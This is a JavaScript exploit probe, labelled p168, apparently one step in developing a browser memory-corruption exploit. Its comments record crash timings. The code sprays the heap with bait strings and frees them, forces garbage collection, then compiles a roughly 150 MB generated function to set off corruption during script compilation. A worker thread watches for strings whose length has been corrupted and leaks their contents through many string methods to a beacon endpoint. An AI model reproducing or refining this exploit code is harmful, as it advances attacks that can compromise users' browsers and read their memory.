// p168 — Watch BEFORE compile, not after
//
// KEY INSIGHT from p156 timestamps:
//   COMPILED-OK at t=119442
//   W-LEN-0-81400 at t=119443 (1ms later!)
//   CALLING at t=119643 (200ms later, then crash)
//
// The corruption happens during finishCreation() which runs when the
// script tag loads, NOT when we call the function. p156 caught it
// because its worker was already polling when the script compiled.
// Every probe since then starts watching AFTER compile — too late
// if the process crashes during the call.
//
// Fix: start worker watching IMMEDIATELY after targets are allocated,
// BEFORE the script tag is appended. The worker polls during compilation
// AND during the 200ms setTimeout AND during the function call.
//
// Also: don't call the function at all. We don't need to. The sweep
// already happened during compile. Just let the worker read.
//
// Beacon prefix: V168-

(function() {
  var BASE = location.protocol + '//' + location.host;
  function B(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', BASE + '/beacon/V168-' + tag + '?t=' + Date.now(), true);
      x.send();
    } catch(e) {}
  }
  function hx(v) { return (v < 16 ? '0' : '') + v.toString(16); }

  var attempt = 0;
  try {
    attempt = parseInt(localStorage.getItem('p168_attempt') || '0');
    localStorage.setItem('p168_attempt', '' + (attempt + 1));
  } catch(e) {}

  B('BOOT-ATT' + attempt);

  // ── WORKER: starts watching IMMEDIATELY, extracts with every method ──
  var workerCode = function() {
    var targets = [];
    var baseUrl = '';
    var STR_LEN = 100000;

    function beacon(tag) {
      try {
        var x = new XMLHttpRequest();
        x.open('GET', baseUrl + '/beacon/V168-W-' + tag + '?t=' + Date.now(), true);
        x.send();
      } catch(e) {}
    }
    function hx(v) { return (v < 16 ? '0' : '') + v.toString(16); }

    self.onmessage = function(e) {
      if (e.data.cmd === 'init') {
        baseUrl = e.data.baseUrl;
        beacon('ALIVE');
        return;
      }
      if (e.data.cmd === 'alloc') {
        var chunk = '';
        for (var k = 0; k < 100; k++) chunk += 'AAAAAAAAAA';
        for (var i = 0; i < 14; i++) {
          var s = '';
          for (var j = 0; j < STR_LEN; j += 1000) s += chunk;
          s = s.substring(0, STR_LEN);
          s.charCodeAt(0);
          targets.push(s);
        }
        beacon('TARGETS-' + targets.length);
        self.postMessage({ ready: true });
        // IMMEDIATELY start watching, don't wait for another message
        watchLoop();
        return;
      }
    };

    function watchLoop() {
      beacon('WATCHING-NOW');
      var found = false;
      var iters = 0;

      while (!found) {
        for (var i = 0; i < targets.length; i++) {
          if (targets[i].length !== STR_LEN) {
            found = true;
            break;
          }
        }
        iters++;
        if (iters % 500000 === 0) beacon('POLL-' + iters);
      }

      // ── CORRUPTION DETECTED ──
      beacon('FOUND-iter' + iters);

      // All lengths
      var lens = '';
      for (var i = 0; i < targets.length; i++) {
        lens += targets[i].length + ',';
      }
      beacon('LENS-' + lens);

      // Extract from each corrupted string
      for (var i = 0; i < targets.length; i++) {
        var len = targets[i].length;
        if (len === STR_LEN) continue;

        beacon('T' + i + '-len=' + len + '-0x' + len.toString(16));

        // codePointAt
        try {
          var cp = '';
          for (var b = 0; b < 8; b++) cp += targets[i].codePointAt(b) + ',';
          beacon('CP' + i + '-' + cp);
        } catch(e) { beacon('CP' + i + '-ERR'); }

        // normalize
        try {
          var norm = targets[i].substring(0, 16).normalize('NFC');
          var nb = '';
          for (var b = 0; b < norm.length; b++) nb += hx(norm.charCodeAt(b));
          beacon('NORM' + i + '-' + nb);
        } catch(e) { beacon('NORM' + i + '-ERR-' + (e.message||'').substring(0,30)); }

        // split
        try {
          var spl = targets[i].substring(0, 8).split('');
          var sb = '';
          for (var b = 0; b < spl.length; b++) sb += hx(spl[b].charCodeAt(0));
          beacon('SPL' + i + '-' + sb);
        } catch(e) { beacon('SPL' + i + '-ERR'); }

        // regex for non-A bytes
        try {
          var m = targets[i].substring(0, 64).match(/[^\x41]/);
          if (m) {
            beacon('RX' + i + '-hit=' + m.index + '-v=' + hx(m[0].charCodeAt(0)));
          } else {
            beacon('RX' + i + '-allA');
          }
        } catch(e) { beacon('RX' + i + '-ERR'); }

        // TextEncoder
        try {
          var enc = new TextEncoder();
          var bytes = enc.encode(targets[i].substring(0, 32));
          var te = '';
          for (var b = 0; b < bytes.length; b++) te += hx(bytes[b]);
          beacon('TE' + i + '-' + te.substring(0, 200));
        } catch(e) { beacon('TE' + i + '-ERR-' + (e.message||'').substring(0,30)); }

        // btoa
        try {
          var b64 = btoa(targets[i].substring(0, 32));
          beacon('B64-' + i + '-' + b64.substring(0, 80));
        } catch(e) { beacon('B64-' + i + '-ERR-' + (e.message||'').substring(0,30)); }

        // indexOf for non-A content
        try {
          var nulPos = targets[i].indexOf('\x00');
          var ffPos = targets[i].indexOf('\xff');
          beacon('IDX' + i + '-nul=' + nulPos + '-ff=' + ffPos);
        } catch(e) { beacon('IDX' + i + '-ERR'); }

        // startsWith / includes
        try {
          var sw = targets[i].startsWith('A');
          var inc = targets[i].includes('\x00');
          beacon('SI' + i + '-startsA=' + sw + '-hasNull=' + inc);
        } catch(e) { beacon('SI' + i + '-ERR'); }

        // structuredClone
        try {
          var cloned = structuredClone(targets[i].substring(0, 32));
          var cl = '';
          for (var b = 0; b < cloned.length; b++) cl += hx(cloned.charCodeAt(b));
          beacon('SC' + i + '-' + cl.substring(0, 200));
        } catch(e) { beacon('SC' + i + '-ERR-' + (e.message||'').substring(0,30)); }

        // charCodeAt at structure offsets
        if (len > 112) {
          var struct = '';
          var offsets = [0,4,8,12,16,20,24,28,32,48,56,64,68,72,80,96,104,108,112];
          for (var oi = 0; oi < offsets.length; oi++) {
            try {
              struct += offsets[oi] + ':' + hx(targets[i].charCodeAt(offsets[oi])) + ',';
            } catch(e) { struct += offsets[oi] + ':ERR,'; }
          }
          beacon('STRUCT' + i + '-' + struct.substring(0, 200));
        }

        // rawlen breakdown
        try {
          var b0 = len & 0xFF;
          var b1 = (len >> 8) & 0xFF;
          var b2 = (len >> 16) & 0xFF;
          var b3 = (len >> 24) & 0xFF;
          beacon('RAWLEN' + i + '-' + hx(b3) + hx(b2) + hx(b1) + hx(b0));
        } catch(e) {}

        if (i >= 2) break;
      }
      beacon('EXTRACT-DONE');
    }
  };

  var workerBlob = new Blob(
    ['(' + workerCode.toString() + ')()'],
    { type: 'application/javascript' }
  );
  var worker = new Worker(URL.createObjectURL(workerBlob));
  worker.postMessage({ cmd: 'init', baseUrl: BASE });

  // ── PHASE 1: BAITS ──
  var N_BAIT = 20 + (attempt % 5) * 2;
  var STR_LEN = 100000;
  B('BAIT-START-N' + N_BAIT);
  var baits = [];
  var baitChunk = '';
  for (var k = 0; k < 100; k++) baitChunk += 'BBBBBBBBBB';
  for (var i = 0; i < N_BAIT; i++) {
    var bait = '';
    for (var j = 0; j < STR_LEN; j += 1000) bait += baitChunk;
    bait = bait.substring(0, STR_LEN);
    bait.charCodeAt(0);
    baits.push(bait);
  }
  baitChunk = null;
  B('BAIT-DONE-' + N_BAIT);

  // ── PHASE 2: WORKER TARGETS (worker starts watching immediately after alloc) ──
  worker.onmessage = function(e) {
    if (e.data.ready) phaseFreeBaits();
  };
  B('WORKER-ALLOC');
  worker.postMessage({ cmd: 'alloc' });

  // ── PHASE 3: FREE + GC ──
  function phaseFreeBaits() {
    B('FREE-START');
    for (var i = 0; i < baits.length; i++) baits[i] = null;
    baits = null;

    var gcRound = 0;
    function gcPressureRound() {
      for (var j = 0; j < 1000; j++) new ArrayBuffer(8192);
      for (var j = 0; j < 500; j++) new Array(100).fill(gcRound);
      gcRound++;
      if (gcRound < 30) setTimeout(gcPressureRound, 30);
      else { B('GC-DONE-' + gcRound); phaseBuild(); }
    }
    gcPressureRound();
  }

  // ── PHASE 4: BUILD ONLY — don't call the function ──
  // The sweep happens during script compilation (finishCreation).
  // The worker is already watching. After compile, just wait.
  function phaseBuild() {
    B('BUILD-START');
    var N = 38348816;
    var CHUNK = 4000000;
    var CHUNKS = Math.floor(N / CHUNK);
    var REM = N - CHUNKS * CHUNK;

    var callChunk = '';
    for (var c = 0; c < CHUNK; c++) callChunk += 'a();';
    var remChunk = '';
    for (var r = 0; r < REM; r++) remChunk += 'a();';

    var parts = ['window.__v168fn=function(a){'];
    for (var ch = 0; ch < CHUNKS; ch++) parts.push(callChunk);
    parts.push(remChunk);
    parts.push('};window.__v168ok=true;');

    var blob = new Blob(parts, { type: 'application/javascript' });
    B('BLOB-' + (blob.size / 1024 / 1024).toFixed(0) + 'MB');
    callChunk = null;
    remChunk = null;
    parts = null;

    var url = URL.createObjectURL(blob);
    var sc = document.createElement('script');

    sc.onload = function() {
      B('COMPILED-' + (window.__v168ok ? 'OK' : 'FAIL'));
      // DON'T call the function. The sweep already happened.
      // The worker is already extracting data.
      // Just beacon that we survived compilation.
      B('NO-CALL-WAITING');

      // Give the worker 5 seconds to finish extraction
      setTimeout(function() {
        B('TIMEOUT-CHECK');
      }, 5000);
    };

    sc.onerror = function() { B('SCRIPT-ERR'); };
    document.head.appendChild(sc);
    sc.src = url;
  }
})();
